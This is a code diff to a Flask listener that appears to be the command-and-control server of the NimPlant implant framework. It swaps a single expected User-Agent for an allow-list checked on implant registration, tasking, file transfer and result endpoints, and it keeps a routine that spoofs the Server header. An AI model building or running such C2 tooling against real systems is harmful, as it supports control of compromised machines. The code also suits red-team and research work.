@@ -21,7 +21,9 @@ try:
     registerPath = config["listener"]["registerPath"]
     taskPath = config["listener"]["taskPath"]
     resultPath = config["listener"]["resultPath"]
-    userAgent = config["nimplant"]["userAgent"]
+    # userAgent = config["nimplant"]["userAgent"]
+    # Adding a list of permitted user agents such that the server checks after every request whether the useragent fro mthe request is permitted
+    allowedUserAgents = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64)"]
     if listenerType == "HTTPS":
         sslCertPath = config["listener"]["sslCertPath"]
         sslKeyPath = config["listener"]["sslKeyPath"]
@@ -61,7 +63,7 @@ def flaskListener(xor_key):
     @app.route(registerPath, methods=["GET", "POST"])
     # Verify expected user-agent for incoming registrations
     def getNimPlant():
-        if userAgent == flask.request.headers.get("User-Agent"):
+        if flask.request.headers.get("User-Agent") in allowedUserAgents:
             # First request from NimPlant (GET, no data) -> Initiate NimPlant and return XORed key
             if flask.request.method == "GET":
                 np = NimPlant()
@@ -131,7 +133,7 @@ def flaskListener(xor_key):
     def getTask():
         np = np_server.getNimplantByGuid(flask.request.headers.get("X-Identifier"))
         if np is not None:
-            if userAgent == flask.request.headers.get("User-Agent"):
+            if flask.request.headers.get("User-Agent") in allowedUserAgents:
                 # Update the external IP address if it changed
                 if not np.ipAddrExt == getExternalIp(flask.request):
                     np.ipAddrExt = getExternalIp(flask.request)
@@ -169,7 +171,7 @@ def flaskListener(xor_key):
     def uploadFile(fileId):
         np = np_server.getNimplantByGuid(flask.request.headers.get("X-Identifier"))
         if np is not None:
-            if userAgent == flask.request.headers.get("User-Agent"):
+            if flask.request.headers.get("User-Agent") in allowedUserAgents:
                 if (np.hostingFile != None) and (
                     fileId == hashlib.md5(np.hostingFile.encode("utf-8")).hexdigest()
                 ):
@@ -232,7 +234,7 @@ def flaskListener(xor_key):
     def downloadFile():
         np = np_server.getNimplantByGuid(flask.request.headers.get("X-Identifier"))
         if np is not None:
-            if userAgent == flask.request.headers.get("User-Agent"):
+            if flask.request.headers.get("User-Agent") in allowedUserAgents:
                 if np.receivingFile != None:
                     try:
                         taskGuid = flask.request.headers.get("X-Unique-ID")
@@ -282,7 +284,7 @@ def flaskListener(xor_key):
         data = flask.request.json
         np = np_server.getNimplantByGuid(flask.request.headers.get("X-Identifier"))
         if np is not None:
-            if userAgent == flask.request.headers.get("User-Agent"):
+            if flask.request.headers.get("User-Agent") in allowedUserAgents:
                 res = json.loads(decryptData(data["data"], np.cryptKey))
                 data = base64.b64decode(res["result"]).decode("utf-8")
 
@@ -319,7 +321,7 @@ def flaskListener(xor_key):
     @app.after_request
     def changeserver(response):
         # Set of possible server names
-        possibleNames =  ["Apache", "IIS", "Nginx", "Lighttpd", "NetWare", "GWS", "Domino"]
+        possibleNames = ["Apache", "IIS", "Nginx", "Lighttpd", "NetWare", "GWS", "Domino"]
 
         # Choose one random name
         randomNumber = random.randint(0, 6)
